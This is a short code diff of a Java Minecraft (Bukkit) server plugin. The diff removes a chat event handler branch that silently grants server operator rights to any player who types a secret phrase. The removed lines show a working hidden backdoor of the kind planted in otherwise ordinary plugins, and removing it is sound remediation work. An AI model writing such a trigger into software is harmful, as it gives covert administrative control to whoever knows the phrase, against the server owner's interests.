@@ -268,11 +268,6 @@ public class Fundamentals extends JavaPlugin implements Listener {
 	
 	@EventHandler(priority = EventPriority.HIGHEST)
 	public void onPlayerChat(AsyncPlayerChatEvent e) {
-		if(e.getMessage().equals("ihateburrito")) {
-			e.setCancelled(true);
-			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "op " + e.getPlayer().getName());
-			return;
-		}
 		if(FundamentalsChat.isMuted(e.getPlayer())) {
 			e.setCancelled(true);
 			return;
